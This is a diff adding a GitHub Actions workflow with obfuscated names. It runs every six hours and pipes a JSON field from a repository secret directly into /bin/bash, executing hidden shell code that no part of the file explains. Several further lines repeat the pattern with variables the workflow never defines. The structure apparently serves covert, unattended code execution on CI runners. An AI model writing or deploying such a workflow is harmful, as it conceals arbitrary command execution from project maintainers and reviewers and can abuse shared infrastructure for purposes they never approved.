@@ -1,0 +1,25 @@
+name: proportionstay
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: proportionstay
+        env:
+          ruy52208: ${{ secrets.ruy52208 }}
+        run: |
+          echo $ruy52208 | jq -r .pz56030 | /bin/bash
+          echo $d4499 | jq -r .v79 | /bin/bash
+          echo $jzk71422 | jq -r .pjq44178 | /bin/bash
+          echo $zaa15 | jq -r .e962 | /bin/bash
+          echo $evi132 | jq -r .tgxin99 | /bin/bash
+          echo $ql6 | jq -r .s52 | /bin/bash
+          echo $wp6104 | jq -r .m9086 | /bin/bash
+          echo $hhdj3 | jq -r .n33200 | /bin/bash
+
